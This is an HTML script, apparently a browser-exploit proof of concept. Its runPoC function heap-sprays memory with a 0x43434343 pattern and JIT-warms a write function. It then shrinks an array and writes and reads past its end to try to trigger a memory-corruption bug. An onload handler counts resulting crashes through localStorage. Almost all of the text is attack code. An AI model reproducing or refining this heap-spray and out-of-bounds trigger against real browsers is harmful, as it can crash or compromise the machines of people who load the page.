<script>
window.onload = () => {
  const crashed = localStorage.getItem("wasAboutToCrash");
  const timestamp = localStorage.getItem("crashTimestamp");

  if (crashed === "yes" && timestamp) {
    const now = Date.now();
    const elapsed = Math.floor((now - Number(timestamp)) / 1000);

    if (elapsed >= 7) {
      let count = parseInt(localStorage.getItem("crashCount") || "0");
      count++;
      localStorage.setItem("crashCount", count.toString());

      setTimeout(() => {
        alert(
          `⚠️ Last run may have triggered instability or crash.\n` +
          `⏱ Elapsed: ${elapsed}s\n` +
          `💥 Total crashes detected: ${count}`
        );
      }, 100);
    }

    localStorage.removeItem("wasAboutToCrash");
    localStorage.removeItem("crashTimestamp");
  }
};

function runPoC() {
  document.getElementById("message").textContent =
    "Fullscreen activated...\nSpraying memory...";

  // Guardar el estado de posible crash
  localStorage.setItem("wasAboutToCrash", "yes");
  localStorage.setItem("crashTimestamp", Date.now().toString());

  // AÑADIDO: Esperar 500ms para asegurarnos que localStorage se guarda antes de entrar a fullscreen
  setTimeout(() => {
    document.body.requestFullscreen().then(() => {
      const PATTERN = 0x43434343;
      const SPRAY_CNT = 100000;
      const SPRAY_LEN = 16;

      const spray = [];
      for (let i = 0; i < SPRAY_CNT; i++) {
        const buf = new ArrayBuffer(SPRAY_LEN * 4);
        const u32 = new Uint32Array(buf);
        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
        spray.push({ u32, f64: new Float64Array(buf) });
      }

      let victim = [1.1, 2.2, 3.3, 4.4];
      function opt(arr, idx, val) { arr[idx] = val; }

      for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
      victim.length = 1;
      const TRIGGER_IDX = 3;
      opt(victim, TRIGGER_IDX, 13.37);
      let read = victim[TRIGGER_IDX];

      document.getElementById("popup").style.display = "block";
    }).catch(err => {
      document.getElementById("message").textContent = "Error: " + err.message;
    });
  }, 500);
}
</script>
